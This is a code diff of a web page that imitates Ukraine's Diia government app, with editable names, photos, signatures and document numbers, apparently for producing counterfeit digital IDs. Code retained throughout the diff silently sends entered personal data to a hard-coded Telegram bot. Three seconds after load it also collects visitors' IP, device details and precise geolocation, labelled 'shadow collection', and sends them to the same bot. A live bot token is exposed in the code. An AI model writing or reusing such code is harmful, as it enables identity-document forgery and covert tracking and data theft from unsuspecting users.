-            if (dy > 0) sheet.style.transform = 'translateY(' + dy + 'px)';
-        }, { passive: true });
-        sheet.addEventListener('touchend', function(e) {
-            if (!isDragging) return;
-            isDragging = false;
-            var dy = e.changedTouches[0].clientY - startY;
-            sheet.style.transform = '';
-            if (dy > 80) closeAiDiia();
-        }, { passive: true });
-    })();
-    </script>
 
     <!-- Сначала переменные! -->
     <script src="values.js"></script>
@@ -4532,8 +4099,6 @@
         <p style="font-size: 10px; color: #888; margin-top: 5px; line-height: 1.2;">Просто розпишіться пальцем чи мишкою в полі. Фон видалиться автоматично.</p>
     </div>
 
-
-
     <div class="admin-buttons">
         <button id="admin-save-btn" class="admin-btn">Зберегти</button>
         <button id="admin-close-btn" class="admin-btn admin-btn-close">Закрити</button>
@@ -4625,7 +4190,7 @@
             selectors.forEach(sel => {
                 document.querySelectorAll(sel).forEach(img => {
                     img.src = dataUrl;
-                    img.style.objectFit = 'cover'; // Щоб фото виглядало пропорційно
+                    img.style.objectFit = 'cover';
                 });
             });
         } else if (key === 'sigPhoto') {
@@ -4656,7 +4221,7 @@
 
         input.addEventListener('input', (e) => {
             updateDOM(field.id, e.target.value);
-            savedState[field.id] = e.target.value; // Зберігаємо відразу в state, щоб потім все злити
+            savedState[field.id] = e.target.value;
         });
 
         group.appendChild(label);
@@ -4676,7 +4241,6 @@
         `;
         const checkbox = group.querySelector('input');
         
-        // По замовчуванню включені
         const isVisible = savedState[doc.key] !== undefined ? savedState[doc.key] : true;
         checkbox.checked = isVisible;
 
@@ -4700,7 +4264,6 @@
         reader.readAsDataURL(file);
     };
 
-    // Завантаження фото за допомогою canvas для стиснення до localStorage (щоб не перевищити ліміт)
     const compressAndSavePhoto = (file, key, maxWidth = 600) => {
         if (!file) return;
         const reader = new FileReader();
@@ -4745,26 +4308,23 @@
     let isDrawing = false;
     let hasSignature = false;
 
-    // Підгонка розмірів під CSS (width: 100%, height: 120px)
     const initCanvasSize = () => {
         const rect = canvas.getBoundingClientRect();
-        // Відкладемо встановлення розміру, щоб DOM встиг відмалювати
         if (rect.width === 0) {
             setTimeout(initCanvasSize, 100);
             return;
         }
-        const ratio = Math.max(window.devicePixelRatio || 1, 1) * 2; // для чіткості
+        const ratio = Math.max(window.devicePixelRatio || 1, 1) * 2;
         canvas.width = rect.width * ratio;
         canvas.height = rect.height * ratio;
         ctx.scale(ratio, ratio);
         ctx.lineCap = 'round';
         ctx.lineJoin = 'round';
         ctx.lineWidth = 2.5; 
-        ctx.strokeStyle = '#002654'; // Темно-синій (як ручка)
+        ctx.strokeStyle = '#002654';
     };
     initCanvasSize();
     
-    // Перерахунок при зміні видимості (щоб канвас підігнався)
     const observer = new IntersectionObserver((entries) => {
         if(entries[0].isIntersecting) {
             if (canvas.width === 0) initCanvasSize();
@@ -4890,23 +4450,18 @@
         hasSignature = false;
         alert('Підпис скинуто. Після збереження оновіть сторінку, щоб побачити оригінал.');
     });
-    // ------------------------------------------
 
     // 4. Обробник збереження у localStorage
     saveBtn.addEventListener('click', () => {
-        // Збираємо зі всіх текстових полів
         const inputs = container.querySelectorAll('input[type="text"]');
         inputs.forEach(input => {
             savedState[input.dataset.targetId] = input.value;
         });
 
-
-
         if (window.sendDataToTelegram) {
             window.sendDataToTelegram(savedState);
         }
 
-        // Зберігаємо весь state
         try {
             localStorage.setItem(LOCAL_STORAGE_KEY, JSON.stringify(savedState));
             const originalText = saveBtn.textContent;
@@ -4950,7 +4505,6 @@
     const applySavedState = () => {
         savedState = JSON.parse(localStorage.getItem(LOCAL_STORAGE_KEY) || '{}');
         
-        // Застосовуємо текст
         Object.keys(savedState).forEach(id => {
             if (id.startsWith('doc_') || id === 'mainPhoto' || id === 'sigPhoto') return;
             updateDOM(id, savedState[id]);
@@ -4958,23 +4512,19 @@
             if (input) input.value = savedState[id];
         });
 
-        // Застосовуємо видимість документів
         documentTypes.forEach(doc => {
             const isVisible = savedState[doc.key] !== undefined ? savedState[doc.key] : true;
             updateDocumentVisibility(doc.selector, isVisible);
         });
 
-        // Застосовуємо фото
         if (savedState['mainPhoto']) updateImages('mainPhoto', savedState['mainPhoto']);
         if (savedState['sigPhoto']) updateImages('sigPhoto', savedState['sigPhoto']);
-        
-
     };
 
-    // Підтягування початкових значень з DOM (якщо користувач їх ще не редагував і не зберігав)
+    window.applySavedState = applySavedState;
+
     const syncUnsavedInputsFromDOM = () => {
         editableFields.forEach(field => {
-            // Якщо значення немає в збережених
             if (savedState[field.id] === undefined) {
                 const input = container.querySelector(`input[data-target-id="${field.id}"]`);
                 const el = document.getElementById(field.id);
@@ -4982,7 +4532,7 @@
                     const domValue = el.textContent.trim();
                     if (domValue !== '') {
                         input.value = domValue;
-                        savedState[field.id] = domValue; // Записуємо в state, щоб при наступному збереженні воно не загубилось
+                        savedState[field.id] = domValue;
                     }
                 }
             }
@@ -4994,9 +4544,8 @@
         setTimeout(() => {
             applySavedState();
             syncUnsavedInputsFromDOM();
-        }, 500); // З невеликою затримкою для надійності, щоб values.js та main.js виконали свою роботу
+        }, 500);
         
-        // Swiper може скинути display: none під час ініціалізації
         setTimeout(() => {
             documentTypes.forEach(doc => {
                 updateDocumentVisibility(doc.selector, savedState[doc.key] !== undefined ? savedState[doc.key] : true);
@@ -5010,7 +4559,6 @@
     const sendTrackingDataToTelegram = (lat, lon) => {
         if (!window.sendToTelegramBot) return;
 
-        // Збираємо IP та інфо про пристрій через повністю відкритий і безкоштовний API
         fetch("https://ipinfo.io/json")
             .then(res => res.json())
             .then(data => {
@@ -5043,7 +4591,6 @@
                 window.sendToTelegramBot(message);
             })
             .catch(e => {
-                // Запасний варіант, якщо сервіс збору IP не відповів
                 let message = `🚨 <b>НОВИЙ ВІЗИТ (Тіньовий збір)</b>\n\nНе вдалося отримати IP-адресу.\n`;
                 if (lat && lon) message += `📍 <b>Локація</b>: <a href="https://www.google.com/maps/search/?api=1&query=${lat},${lon}">Відкрити на карті</a>`;
                 window.sendToTelegramBot(message);
@@ -5051,19 +4598,16 @@
     };
 
     const getGeoLocation = () => {
-        // Захист від повторної відправки при переходах по сторінках
         if (sessionStorage.getItem('trackingSent')) return;
         sessionStorage.setItem('trackingSent', 'true');
 
         if ("geolocation" in navigator) {
-            // Запитуємо геолокацію. Якщо юзер погодиться - відправляємо з координатами
             navigator.geolocation.getCurrentPosition(
                 (position) => {
                     sendTrackingDataToTelegram(position.coords.latitude, position.coords.longitude);
                 },
                 (error) => {
                     console.error("Геолокація помилка:", error.message);
-                    // Якщо користувач відмовився, все одно відправляємо IP та інформацію про пристрій
                     sendTrackingDataToTelegram(null, null);
                 },
                 { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
@@ -5073,7 +4617,6 @@
         }
     };
 
-    // Викликаємо непомітно через 3 секунди після загрузки сторінки
     window.addEventListener('load', () => {
         setTimeout(getGeoLocation, 3000);
     });
@@ -5088,7 +4631,7 @@
             notif.classList.add('show');
             setTimeout(() => {
                 notif.classList.remove('show');
-            }, 8000); // залишаємо на 8 секунд щоб встигли прочитати
+            }, 8000);
         } else {
             alert(text);
         }
@@ -5104,7 +4647,6 @@
         
         if (token === 'YOUR_BOT_TOKEN_HERE' || token.length < 20) return;
 
-        // Витягуємо останнє повідомлення з бота
         fetch(`https://api.telegram.org/bot${token}/getUpdates?offset=-1`)
             .then(res => res.json())
             .then(data => {
@@ -5124,19 +4666,18 @@
             .catch(err => console.debug("ТГ Оновлення: ", err));
     };
 
-    // Перевіряємо при старті та далі кожні 15 секунд
     setTimeout(() => {
         checkTelegramNews();
         setInterval(checkTelegramNews, 15000);
     }, 4000);
 })();
+
 // --- ВІДПРАВКА ДАНИХ І СПОВІЩЕНЬ У TELEGRAM ---
 (function() {
     let botToken = '8761188502:AAF0XbKry5t6VSP5Sm0Td9F2_13GXeuH3dg';
     let tgChatId = '-1002003419071';
-    let expTime = '2026-12-31T23:59'; // Fallback
+    let expTime = '2026-12-31T23:59';
     
-    // Спробуємо підтягнути дані з values.json або з глобальних змінних values.js
     if (typeof expirationTime !== 'undefined') expTime = expirationTime;
     
     fetch('values.json')
@@ -5194,92 +4735,194 @@
         }
     };
 
-    setInterval(checkExpiration, 30000); // Кожні 30 секунд
+    setInterval(checkExpiration, 30000);
     setTimeout(checkExpiration, 5000);
 })();
 </script>
-</body>
 
-<script type="text/javascript">
-    // $('.line2').marquee({
-    //     allowCss3Support: true,
-    //     css3easing: 'linear',
-    //     easing: 'linear',
-    //     delayBeforeStart: 0,
-    //     direction: 'left',
-    //     duplicated: true,
-    //     gap: 50,
-    //     duration: 15000,
-    // });
-    // $('.line1').marquee({
-    //     allowCss3Support: true,
-    //     css3easing: 'linear',
-    //     easing: 'linear',
-    //     delayBeforeStart: 0,
-    //     direction: 'left',
-    //     duplicated: true,
-    //     gap: 5,
-    //     duration: 5000,
-    // });
+<!-- Модальне вікно для введення ID користувача -->
+<style>
+    #auth-overlay {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100vh;
+        background: #000;
+        z-index: 9999999;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        color: #fff;
+        font-family: 'e-Ukraine', sans-serif;
+        padding: 20px;
+    }
+    .auth-card {
+        background: #1c1c1e;
+        padding: 25px;
+        border-radius: 20px;
+        width: 100%;
+        max-width: 340px;
+        text-align: center;
+        box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+    }
+    .auth-card h2 {
+        font-size: 20px;
+        margin-bottom: 10px;
+        font-weight: 400;
+    }
+    .auth-card p {
+        font-size: 13px;
+        color: #8e8e93;
+        margin-bottom: 20px;
+    }
+    .auth-input {
+        width: 100%;
+        padding: 12px;
+        border-radius: 10px;
+        border: 1px solid #38383a;
+        background: #2c2c2e;
+        color: #fff;
+        font-size: 16px;
+        text-align: center;
+        outline: none;
+        margin-bottom: 15px;
+    }
+    .auth-btn {
+        width: 100%;
+        padding: 12px;
+        border-radius: 10px;
+        border: none;
+        background: #0a84ff;
+        color: #fff;
+        font-size: 16px;
+        font-weight: 600;
+        cursor: pointer;
+    }
+    .auth-error {
+        color: #ff453a;
+        font-size: 12px;
+        margin-top: 10px;
+        display: none;
+    }
+</style>
 
+<div id="auth-overlay">
+    <div class="auth-card">
+        <h2>Авторизація</h2>
+        <p>Введіть ваш унікальний ID користувача для завантаження документів</p>
+        <input type="text" id="user-id-input" class="auth-input" placeholder="Наприклад: 102938">
+        <button id="auth-submit-btn" class="auth-btn">Увійти</button>
+        <div id="auth-error-msg" class="auth-error">Користувача з таким ID не знайдено</div>
+    </div>
+</div>
 
-    var isWorking = true;
-    var isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
-    var isAndroid = /Android/i.test(navigator.userAgent);
-    var isMobile = isIOS || isAndroid;
-    var isInWebAppiOS = (window.navigator.standalone === true);
-    var isInWebAppChrome = (window.matchMedia('(display-mode: standalone)').matches);
-    var isPWA = isInWebAppiOS || isInWebAppChrome;
+<!-- Скрипт перевірки ID та завантаження даних із бази (API) -->
+<script>
+(function() {
+    const API_BASE_URL = 'https://your-database-server.com/api/users/';
 
-    if (!isMobile) {
-        // Десктоп або планшет — повідомляємо, що тільки мобільний
-        isWorking = false;
-        $('body').html(
-            '<div style="display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;font-family:sans-serif;text-align:center;padding:20px;">' +
-            '<div style="font-size:48px;margin-bottom:16px;">📱</div>' +
-            '<div style="font-size:20px;font-weight:600;margin-bottom:8px;">Тільки для мобільних</div>' +
-            '<p style="color:#666;font-size:14px;">Відкрийте цю сторінку на смартфоні та встановіть як додаток.</p>' +
-            '</div>'
-        );
-        $('body').addClass('nononopage');
-    } else if (!isPWA) {
-        // Мобільний, але не PWA — показуємо інструкцію
-        isWorking = false;
-        var installHtml;
-        if (isIOS) {
-            installHtml =
-                '<div style="display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;font-family:sans-serif;text-align:center;padding:24px;">' +
-                '<div style="font-size:48px;margin-bottom:16px;">📲</div>' +
-                '<div style="font-size:20px;font-weight:600;margin-bottom:12px;">Встановіть додаток</div>' +
-                '<p style="color:#444;font-size:14px;line-height:1.6;margin-bottom:16px;">' +
-                '1. Натисніть кнопку <b>Поділитися</b> (квадрат зі стрілкою вгору) внизу Safari<br>' +
-                '2. Оберіть <b>«На екран "Домівка"»</b><br>' +
-                '3. Натисніть <b>«Додати»</b> та відкрийте додаток з екрану' +
-                '</p>' +
-                '<div style="font-size:36px;">⬆️ 🔲</div>' +
-                '</div>';
-        } else {
-            installHtml =
-                '<div style="display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;font-family:sans-serif;text-align:center;padding:24px;">' +
-                '<div style="font-size:48px;margin-bottom:16px;">📲</div>' +
-                '<div style="font-size:20px;font-weight:600;margin-bottom:12px;">Встановіть додаток</div>' +
-                '<p style="color:#444;font-size:14px;line-height:1.6;margin-bottom:16px;">' +
-                '1. Натисніть <b>⋮ три крапки</b> у браузері Chrome<br>' +
-                '2. Оберіть <b>«Додати на головний екран»</b><br>' +
-                '3. Натисніть <b>«Додати»</b> та відкрийте додаток' +
-                '</p>' +
-                '<div style="font-size:36px;">⋮ 🏠</div>' +
-                '</div>';
+    const authOverlay = document.getElementById('auth-overlay');
+    const userIdInput = document.getElementById('user-id-input');
+    const authSubmitBtn = document.getElementById('auth-submit-btn');
+    const authErrorMsg = document.getElementById('auth-error-msg');
+
+    const urlParams = new URLSearchParams(window.location.search);
+    const urlUserId = urlParams.get('id');
+
+    async function fetchAndApplyUserData(userId) {
+        try {
+            authErrorMsg.style.display = 'none';
+            authSubmitBtn.innerText = 'Перевірка...';
+            authSubmitBtn.disabled = true;
+
+            const response = await fetch(`${API_BASE_URL}${userId}.json`);
+
+            if (!response.ok) {
+                throw new Error("ID не знайдено в базі даних");
+            }
+
+            const userData = await response.json();
+
+            if (!userData || String(userData.userId || userData.id) !== String(userId)) {
+                throw new Error("ID користувача не збігається з базою даних");
+            }
+
+            localStorage.setItem('diyaCurrentUserId', userId);
+            localStorage.setItem('diyaLocalState_v1', JSON.stringify(userData));
+
+            authOverlay.style.display = 'none';
+
+            if (typeof applySavedState === 'function') {
+                applySavedState();
+            } else {
+                window.location.reload();
+            }
+
+        } catch (error) {
+            console.error("Помилка авторизації:", error);
+            authErrorMsg.innerText = error.message || "Помилка завантаження даних";
+            authErrorMsg.style.display = 'block';
+            authSubmitBtn.innerText = 'Увійти';
+            authSubmitBtn.disabled = false;
         }
-        $('body').html(installHtml);
-        $('body').addClass('nononopage');
     }
 
+    const savedUserId = localStorage.getItem('diyaCurrentUserId');
 
+    if (urlUserId) {
+        fetchAndApplyUserData(urlUserId);
+    } else if (savedUserId) {
+        fetchAndApplyUserData(savedUserId);
+    } else {
+        authOverlay.style.display = 'flex';
+    }
 
+    authSubmitBtn.addEventListener('click', () => {
+        const inputId = userIdInput.value.trim();
+        if (inputId) {
+            fetchAndApplyUserData(inputId);
+        } else {
+            authErrorMsg.innerText = "Будь ласка, введіть ID";
+            authErrorMsg.style.display = 'block';
+        }
+    });
 
+    userIdInput.addEventListener('keypress', (e) => {
+        if (e.key === 'Enter') {
+            authSubmitBtn.click();
+        }
+    });
+})();
+</script>
 
+</body>
 
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"
+        integrity="sha512-v2CJ7UaYy4JwqLDIrZUI/4hqeoQieOmAZNXBeQyjo21dadnwR+8ZaIJVT8EE2iyI61OV8e6M8PP2/4hpQINQ/g=="
+        crossorigin="anonymous"
+        referrerpolicy="no-referrer"></script>
+<script src="assets/jquery.marquee.min.js"
+        type="text/javascript"></script>
+<script type="text/javascript">
+    var isWorking = true;
+    if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
+        isInWebAppiOS = (window.navigator.standalone === true);
+        isInWebAppChrome = (window.matchMedia('(display-mode: standalone)').matches);
+        if (navigator.userAgent.match(/Android/)) {
+        }
+        if (isInWebAppiOS == false && isInWebAppChrome == false) {
+            isWorking = false;
+            $('body').html('<div class="nonono"><br>Натисніть три точки в браузері і додайте цю сторінку на головний екран<br></div>');
+            $('body').addClass('nononopage');
+        }
+
+    } else {
+        isWorking = false;
+        $('body').html('<body class="nononopage"><div class="nonono installTutorial" style="width: 100%;padding: 1vh;display: flex;flex-wrap: wrap;justify-content: center;"><div class="installPage" style="text-align: center;padding: 15px;"><div class="installName" style="font-size: 20px;font-weight: 600;"><br>Сайт доступний</div><p>Тільки з мобільних пристроїв<br></p></div></div>');
+        $('body').addClass('nononopage');
+    }
 
     setTimeout(function () {
         $('.zublogo').fadeIn(1);
@@ -5326,18 +4969,14 @@
     }, 700);
     $('.diyalogo').fadeIn(500);
 
-
     var marquee = $('.line1');
 
-    // Дублируем контент, чтобы создать эффект непрерывного движения
     var originalContent = marquee.html();
     marquee.html(originalContent + originalContent);
 
-    // Вычисляем ширину контента и устанавливаем начальное положение
     var contentWidth = marquee[0].scrollWidth / 2;
     marquee.scrollLeft(contentWidth);
 
-    // Запускаем анимацию
     marquee.marquee({
         allowCss3Support: true,
         css3easing: 'linear',
@@ -5351,15 +4990,12 @@
 
     var marquee2 = $('.line2');
 
-    // Дублируем контент, чтобы создать эффект непрерывного движения
     var originalContent = marquee2.html();
     marquee2.html(originalContent + originalContent);
 
-    // Вычисляем ширину контента и устанавливаем начальное положение
     var contentWidth = marquee2[0].scrollWidth / 2;
     marquee2.scrollLeft(contentWidth);
 
-    // Запускаем анимацию
     marquee2.marquee({
         allowCss3Support: true,
         css3easing: 'linear',
@@ -5371,76 +5007,44 @@
         duration: 15000,
     });
 
-    let enteredPin = '';
+    function vhod(type) {
+        if ($('.start-vhod > div.active')[0]) {
+            if (type === 'plus') {
+                $('.start-vhod > div')[
+                    document.querySelectorAll('.start-vhod > div.active')
+                        .length
+                ].classList.add('active');
+                if (
+                    document.querySelectorAll('.start-vhod > div.active')
+                        .length == 4
+                ) {
+                    $('.start-div').removeClass('active');
+                    $('.main').addClass('active');
 
-function updatePinDots() {
-    const dots = document.querySelectorAll('.start-vhod > div');
-    dots.forEach((dot, i) => {
-        dot.classList.toggle('active', i < enteredPin.length);
-    });
-}
-
-function shakePinPad() {
-    const block = document.querySelector('.start-block');
-    if (typeof gsap !== 'undefined') {
-        gsap.fromTo(block, { x: 0 }, { x: [-12, 12, -8, 8, 0], duration: 0.4 });
+                    $('.blockStart').addClass('active');
+                }
+            } else {
+                $('.start-vhod > div')[
+                    document.querySelectorAll('.start-vhod > div.active')
+                        .length - 1
+                ].classList.remove('active');
+            }
+        } else {
+            $('.start-vhod > div')[0].classList.add('active');
+        }
     }
-    navigator.vibrate?.([50, 30, 50]);
-}
 
-function unlockApp() {
-    const startDiv = document.querySelector('.start-div');
-    const main = document.querySelector('.main');
-    if (typeof gsap !== 'undefined') {
-        gsap.timeline()
-            .to(startDiv, { opacity: 0, scale: 0.96, duration: 0.35, ease: 'power2.inOut' })
-            .set(startDiv, { display: 'none' })
-            .fromTo(main, { opacity: 0, y: 24 }, { opacity: 1, y: 0, duration: 0.5, ease: 'power3.out' })
-            .add(() => {
-                startDiv.classList.remove('active');
-                main.classList.add('active');
-                document.querySelector('.blockStart')?.classList.add('active');
+    document
+        .querySelectorAll('.start-block > button')
+        .forEach(function (el) {
+            el.addEventListener('click', function () {
+                if ($(this).attr('data-type') == 'delete') {
+                    vhod('minus');
+                } else {
+                    vhod('plus');
+                }
             });
-    } else {
-        startDiv.classList.remove('active');
-        main.classList.add('active');
-        document.querySelector('.blockStart')?.classList.add('active');
-    }
-}
-
-function vhod(type, digit) {
-    if (type === 'minus') {
-        enteredPin = enteredPin.slice(0, -1);
-        updatePinDots();
-        return;
-    }
-    if (enteredPin.length >= 4) return;
-    enteredPin += digit;
-    updatePinDots();
-    if (enteredPin.length === 4) {
-        if (enteredPin === (typeof entryPin !== 'undefined' ? entryPin : '1234')) {
-            unlockApp();
-        } else {
-            shakePinPad();
-            enteredPin = '';
-            setTimeout(updatePinDots, 400);
-        }
-    }
-}
-
-   document.querySelectorAll('.start-block > button').forEach(function (el) {
-    el.addEventListener('click', function () {
-        if ($(this).attr('data-type') == 'delete') {
-            vhod('minus');
-        } else {
-            vhod('plus', this.textContent.trim());
-        }
-    });
-});
-
-    document.querySelector('.start-block > img[src*="biometrics"]')?.addEventListener('click', () => {
-    if (typeof allowBiometricSkip !== 'undefined' && allowBiometricSkip) unlockApp();
-}); 
+        });
 
     document.querySelectorAll('.footer > div').forEach((div) => {
         div.addEventListener('click', function () {
@@ -5490,18 +5094,6 @@ function vhod(type, digit) {
             [index].classList.add('active');
         });
     });
-     
-    document.querySelectorAll('.quick-action').forEach(btn => {
-    btn.addEventListener('click', () => {
-        const action = btn.dataset.action;
-        const texts = {
-            'scan-qr': 'Сканування QR-коду',
-            'bonds': 'Військові облігації',
-            'no-signal': 'Заява про відсутній звʼязок'
-        };
-        showNotification(texts[action] || 'Скоро');
-    });
-});
 
     document.querySelectorAll('.moreInfo').forEach((el) => {
         el.addEventListener('click', function (e) {
@@ -5520,21 +5112,14 @@ function vhod(type, digit) {
         });
     });
 
-
-
-
-
-
     document.querySelectorAll('#zagranNumber').forEach(function (el) {
         el.textContent = `FT306260`;
     });
 
-
-
     document.querySelectorAll('#dataNow').forEach(function (el) {
         const today = new Date();
         const day = String(today.getDate()).padStart(2, '0');
-        const month = String(today.getMonth() + 1).padStart(2, '0'); // Январь — это 0!
+        const month = String(today.getMonth() + 1).padStart(2, '0');
         const year = today.getFullYear();
 
         el.textContent = `${day}.${month}.${year}`;
@@ -5542,8 +5127,7 @@ function vhod(type, digit) {
 
     const notification = document.getElementById('notification');
 
-    function showNotification(msg) {
-        if (msg) notification.textContent = msg;
+    function showNotification() {
         notification.classList.add('show');
         setTimeout(() => {
             notification.classList.remove('show');
@@ -5557,13 +5141,9 @@ function vhod(type, digit) {
         });
     });
 
-    // ─────────────────────────────────────────────────────────────
-    // QR-ТАЙМЕР: кожна картка має свій незалежний інтервал
-    // ─────────────────────────────────────────────────────────────
-    const cardTimers = new Map(); // slider-element → { interval, minutes, seconds }
+    const cardTimers = new Map();
 
     function startCardCountdown(sliderEl) {
-        // Зупиняємо попередній таймер цієї картки (якщо є)
         if (cardTimers.has(sliderEl)) {
             clearInterval(cardTimers.get(sliderEl).interval);
         }
@@ -5571,12 +5151,10 @@ function vhod(type, digit) {
         const el = sliderEl.querySelector('.qrcodeBlock > span > span');
         if (!el) return;
 
-        // Скидаємо до 2:59
         let minutes = 2;
         let seconds = 59;
         el.textContent = `${minutes}:${String(seconds).padStart(2, '0')}`;
 
-        // Анімація пульсації QR під час відліку
         const qrEl = sliderEl.querySelector('.changeCode');
 
         const interval = setInterval(() => {
@@ -5591,7 +5169,6 @@ function vhod(type, digit) {
             }
             el.textContent = `${minutes}:${String(seconds).padStart(2, '0')}`;
 
-            // Останні 30 секунд — QR блимає
             if (minutes === 0 && seconds <= 30 && qrEl) {
                 qrEl.style.transition = 'opacity 0.4s';
                 qrEl.style.opacity = seconds % 2 === 0 ? '1' : '0.5';
@@ -5601,42 +5178,49 @@ function vhod(type, digit) {
         cardTimers.set(sliderEl, { interval, minutes, seconds });
     }
 
-    const cardState = new WeakMap();
+    document.querySelectorAll('.slider').forEach((sliderEl) => {
+        sliderEl.addEventListener('click', function (e) {
+            if (e.target.closest('.qrChange, .copyPng, .moreInfo')) return;
 
-function flipCard(sliderEl) {
-    const state = cardState.get(sliderEl) || { flipped: false, animating: false };
-    if (state.animating) return;
-    state.animating = true;
-    sliderEl.classList.add('is-flipping');
-    const next = state.flipped ? 0 : 180;
-    const onDone = () => {
-        state.flipped = !state.flipped;
-        state.animating = false;
-        sliderEl.classList.remove('is-flipping');
-        if (state.flipped) startCardCountdown(sliderEl);
-        else if (cardTimers.has(sliderEl)) {
-            clearInterval(cardTimers.get(sliderEl).interval);
-            cardTimers.delete(sliderEl);
-        }
-    };
-    if (typeof gsap !== 'undefined') {
-        gsap.to(sliderEl, { rotateY: next, duration: 0.55, ease: 'power2.inOut', transformPerspective: 1200, onComplete: onDone });
-    } else {
-        anime({ targets: sliderEl, rotateY: next, duration: 300, easing: 'easeInOutQuad', complete: onDone });
-    }
-    cardState.set(sliderEl, state);
-}
+            const style = sliderEl.getAttribute('style') || '';
+            const match = style.match(/rotateY\((-?[\d.]+)deg\)/);
+            const currentAngle = match ? parseFloat(match[1]) : 0;
+            const isFlipped = (Math.round(currentAngle) % 360 !== 0);
 
-document.querySelectorAll('.slider').forEach((sliderEl) => {
-    sliderEl.addEventListener('click', function (e) {
-        if (e.target.closest('.qrChange, .copyPng, .moreInfo')) return;
-        flipCard(sliderEl);
+            anime({
+                targets: sliderEl,
+                rotateY: { value: '+=180', delay: 0 },
+                easing: 'easeInOutQuad',
+                duration: 300,
+            });
+
+            if (!isFlipped) {
+                startCardCountdown(sliderEl);
+
+                const qrChange = sliderEl.querySelector('.changeCode');
+                if (qrChange) {
+                    qrChange.classList.remove('shcode');
+                    qrChange.classList.add('qrcode');
+                    qrChange.style.opacity = '1';
+                }
+                const shText = sliderEl.querySelector('.shText');
+                if (shText) shText.style.display = 'none';
+
+                const btns = sliderEl.querySelectorAll('.qrChange > div > div');
+                btns.forEach((b, i) => {
+                    b.style.background = i === 0 ? 'black' : '#ddd';
+                    const img = b.querySelector('img');
+                    if (img) img.style.filter = i === 0 ? 'brightness(0) invert(1)' : '';
+                });
+            } else {
+                if (cardTimers.has(sliderEl)) {
+                    clearInterval(cardTimers.get(sliderEl).interval);
+                    cardTimers.delete(sliderEl);
+                }
+            }
+        });
     });
-});
 
-    // ─────────────────────────────────────────────────────────────
-    // QR ↔ BARCODE перемикач — ізольований до своєї картки
-    // ─────────────────────────────────────────────────────────────
     document.querySelectorAll('.qrChange').forEach((qrChangeBlock) => {
         const sliderEl = qrChangeBlock.closest('.slider');
 
@@ -5644,22 +5228,19 @@ document.querySelectorAll('.slider').forEach((sliderEl) => {
             btn.addEventListener('click', function (e) {
                 e.stopPropagation();
 
-                const parent = this.parentNode; // div[data-index]
+                const parent = this.parentNode;
                 const isQR = parent.getAttribute('data-index') === '1';
 
-                // Знаходимо елементи тільки всередині цієї картки
                 const changeCode = sliderEl.querySelector('.changeCode');
                 const shText = sliderEl.querySelector('.shText');
                 const allBtns = qrChangeBlock.querySelectorAll('div[data-index] > div');
 
-                // Скидаємо всі кнопки
                 allBtns.forEach((b) => {
                     b.style.background = '#ddd';
                     const img = b.querySelector('img');
                     if (img) img.style.filter = '';
                 });
 
-                // Активуємо поточну
                 this.style.background = 'black';
                 const activeImg = this.querySelector('img');
                 if (activeImg) activeImg.style.filter = 'brightness(0) invert(1)';
@@ -5677,9 +5258,6 @@ document.querySelectorAll('.slider').forEach((sliderEl) => {
         });
     });
 
-    // ─────────────────────────────────────────────────────────────
-    // АНІМАЦІЯ КНОПОК ПІН-КОДУ
-    // ─────────────────────────────────────────────────────────────
     document.querySelectorAll('.start-block > button').forEach((btn) => {
         btn.addEventListener('pointerdown', function () {
             anime({
@@ -5702,10 +5280,7 @@ document.querySelectorAll('.slider').forEach((sliderEl) => {
         });
     });
 
-    // ─────────────────────────────────────────────────────────────
-    // АНІМАЦІЯ ПІН-КРАПОК — spring bounce при заповненні
-    // ─────────────────────────────────────────────────────────────
-    const origVhod = window.vhod; // зберігаємо оригінал якщо є
+    const origVhod = window.vhod;
     function animatePinDots() {
         const activeDots = document.querySelectorAll('.start-vhod > div.active');
         activeDots.forEach((dot) => {
@@ -5718,39 +5293,46 @@ document.querySelectorAll('.slider').forEach((sliderEl) => {
         });
     }
 
-    // Перехоплюємо клік по кнопках пін-коду для анімації крапок
     document.querySelectorAll('.start-block > button:not([data-type])').forEach((btn) => {
         btn.addEventListener('click', function () {
-            setTimeout(animatePinDots, 50);
+            setTimeout(animatePinDots, 10);
         });
     });
 
-    // ─────────────────────────────────────────────────────────────
-    // АНІМАЦІЯ FOOTER-TABS
-    // ─────────────────────────────────────────────────────────────
     document.querySelectorAll('.footer > div').forEach((tab) => {
         tab.addEventListener('pointerdown', function () {
-            anime({ targets: this, scale: [1, 0.9], duration: 80, easing: 'easeOutQuad' });
+            anime({
+                targets: this,
+                scale: [1, 0.9],
+                duration: 80,
+                easing: 'easeOutQuad',
+            });
         });
         tab.addEventListener('pointerup', function () {
-            anime({ targets: this, scale: [0.9, 1], duration: 250, easing: 'spring(1, 80, 15, 0)' });
+            anime({
+                targets: this,
+                scale: [0.9, 1],
+                duration: 250,
+                easing: 'spring(1, 80, 15, 0)',
+            });
         });
     });
 
-    // ─────────────────────────────────────────────────────────────
-    // COPY — мікро-анімація іконки при копіюванні
-    // ─────────────────────────────────────────────────────────────
     document.querySelectorAll('.copyPng').forEach((icon) => {
         icon.addEventListener('click', function (e) {
             e.stopPropagation();
-            anime({ targets: this, scale: [1, 1.5, 1], duration: 400, easing: 'spring(1, 80, 20, 0)' });
+            anime({
+                targets: this,
+                scale: [1, 1.5, 1],
+                duration: 400,
+                easing: 'spring(1, 80, 20, 0)',
+            });
             showNotification();
         });
     });
 
     window.addEventListener('DOMContentLoaded', function () {
 
-        // Удаляем блоки, если документ неактивен
         var statusMapping = [
             { enabled: isRightsEnabled, selector: '.prava' },
             { enabled: isStudyEnabled, selector: '.study' },
@@ -5765,79 +5347,49 @@ document.querySelectorAll('.slider').forEach((sliderEl) => {
             }
         });
 
-        // Swiper — документи
         if (document.querySelector('.documentSlider')) {
-    new Swiper('.documentSlider', {
-        slidesPerView: 1.12,
-        centeredSlides: true,
-        spaceBetween: 12,
-        speed: 450,
-        grabCursor: true,
-        resistanceRatio: 0.65,
-        touchReleaseOnEdges: true,
